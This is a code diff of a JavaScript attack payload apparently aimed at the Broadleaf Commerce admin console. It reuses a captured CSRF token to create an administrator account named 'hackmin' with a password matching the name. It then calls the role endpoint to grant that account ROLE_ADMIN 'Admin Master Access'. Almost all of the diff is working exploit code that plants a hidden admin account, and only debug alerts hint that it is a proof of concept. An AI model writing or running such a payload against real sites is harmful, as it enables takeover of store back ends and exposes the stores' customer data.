@@ -19,20 +19,53 @@ function getTokenJS() {
 }
 
 function submitFormWithTokenJS(token, state) {
-		alert('submit cookie');
+	alert('submit add user');
+
+
+    const username = "hackmin";
 
     var xhr = new XMLHttpRequest();
     xhr.open("POST", "/admin/user-management/add", true);
 
     // Send the proper header information along with the request
     xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    xhr.responseType = "document";
 
     // This is for debugging and can be removed
     xhr.onreadystatechange = function() {
         if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
-            console.log(xhr.responseText);
+            page = xhr.response;
+            userID = page.getElementById("blc-redirect-ur");
+            addAdminAccess(token,state,userID.value);
+
+
+
         }
     }
 
-    xhr.send("ceilingEntityClassname=org.broadleafcommerce.openadmin.server.security.domain.AdminUser&entityType=org.broadleafcommerce.openadmin.server.security.domain.AdminUserImpl&id=&sectionCrumbs=&mainEntityName=&preventSubmit=false&jsErrorMapString=&fields%5B'name'%5D.value=aflibbert&fields%5B'login'%5D.value=aflibbert&fields%5B'email'%5D.value=aflibbert%40example.com&fields%5B'phoneNumber'%5D.value=&fields%5B'password'%5D.value=aflibbert&fields%5B'passwordConfirm'%5D.value=aflibbert&fields%5B'activeStatusFlag'%5D.value=true&fields%5B'auditable__createdBy'%5D.value=&fields%5B'auditable__dateCreated'%5D.value-display=&fields%5B'auditable__dateCreated'%5D.value=&fields%5B'auditable__updatedBy'%5D.value=&fields%5B'auditable__dateUpdated'%5D.value-display=&fields%5B'auditable__dateUpdated'%5D.value=&csrfToken="+token+"&stateVersionToken="+state);
+    xhr.send("ceilingEntityClassname=org.broadleafcommerce.openadmin.server.security.domain.AdminUser&entityType=org.broadleafcommerce.openadmin.server.security.domain.AdminUserImpl&id=&sectionCrumbs=&mainEntityName=&preventSubmit=false&jsErrorMapString=&fields%5B'name'%5D.value="+username+"&fields%5B'login'%5D.value="+username+"&fields%5B'email'%5D.value="+username+"%40example.com&fields%5B'phoneNumber'%5D.value=&fields%5B'password'%5D.value="+username+"&fields%5B'passwordConfirm'%5D.value="+username+"&fields%5B'activeStatusFlag'%5D.value=true&fields%5B'auditable__createdBy'%5D.value=&fields%5B'auditable__dateCreated'%5D.value-display=&fields%5B'auditable__dateCreated'%5D.value=&fields%5B'auditable__updatedBy'%5D.value=&fields%5B'auditable__dateUpdated'%5D.value-display=&fields%5B'auditable__dateUpdated'%5D.value=&csrfToken="+token+"&stateVersionToken="+state);
+}
+
+
+function addAdminAccess(token,state,path) {
+		alert('submit add user');
+
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", path+"/allRoles/add", true);
+
+    // Send the proper header information along with the request
+    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    xhr.responseType = "document";
+
+    // This is for debugging and can be removed
+    xhr.onreadystatechange = function() {
+        if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+           
+
+        }
+    }
+
+    xhr.send("fields%5B'id'%5D.value=-1&fields%5B'description'%5D.value=Admin+Master+Access&fields%5B'__adminMainEntity'%5D.value=ROLE_ADMIN&csrfToken="+token+"&stateVersionToken="+state);
+
+
 }
